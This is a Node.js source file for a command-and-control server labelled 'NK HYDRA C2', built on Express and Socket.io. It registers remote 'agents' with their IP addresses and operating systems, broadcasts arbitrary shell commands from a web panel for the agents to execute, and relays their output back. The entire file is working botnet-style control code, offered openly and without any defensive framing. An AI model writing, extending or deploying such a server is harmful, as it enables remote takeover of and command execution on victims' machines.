// NK HYDRA C2 SERVER v28.8 (REALTIME CORE)
// USAGE: node server.js
// DEPENDENCIES: npm install express socket.io cors

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors()); // Allow all origins (Localhost/Production)

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8,
    pingTimeout: 60000
}); 

let agents = new Map();

// --- EVENTS ---

io.on('connection', (socket) => {
    
    // 1. IDENTIFICATION (Agent or Frontend?)
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentId = data.id;
            const agentIp = socket.handshake.address.replace('::ffff:', '');
            
            console.log(`[+] AGENT CONNECTED: ${agentId} (${agentIp})`);
            
            agents.set(socket.id, { 
                id: agentId, 
                ip: agentIp, 
                os: data.os, 
                socketId: socket.id,
                status: 'ONLINE' 
            });
            
            // Notify Frontend
            io.emit('log', `[SYSTEM] NODE CONNECTED: ${agentId}`);
            broadcastStatus();
        }
    });

    // 2. COMMAND RELAY (Frontend -> Agent)
    socket.on('cmd', (data) => {
        // Log locally on server console
        console.log(`[CMD REQUEST] From WebUI: ${data.cmd} -> Target: ${data.target}`);
        
        // Broadcast to ALL connected sockets (Agents will filter)
        // We call the event 'exec' as expected by agent.py
        io.emit('exec', { 
            cmd: data.cmd, 
            target: data.target || 'ALL' 
        });
        
        // Confirm to Frontend
        io.emit('log', `[C2] RELAYING COMMAND: ${data.cmd}`);
    });

    // 3. LOG STREAM (Agent -> Frontend)
    socket.on('stream_log', (data) => {
        console.log(`[${data.from}] ${data.output}`);
        // Forward directly to Frontend
        io.emit('log', data); 
    });

    socket.on('disconnect', () => {
        if (agents.has(socket.id)) {
            const a = agents.get(socket.id);
            console.log(`[-] AGENT LOST: ${a.id}`);
            agents.delete(socket.id);
            broadcastStatus();
        }
    });
});

function broadcastStatus() {
    const list = Array.from(agents.values()).map(a => ({
        id: a.id, ip: a.ip, os: a.os, status: a.status, lastSeen: Date.now()
    }));
    io.emit('status', { agents: list });
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`------------------------------------------`);
    console.log(`[*] NK HYDRA C2 SERVER LISTENING ON ${PORT}`);
    console.log(`[*] WAITING FOR AGENTS AND FRONTEND...`);
    console.log(`------------------------------------------`);
});
    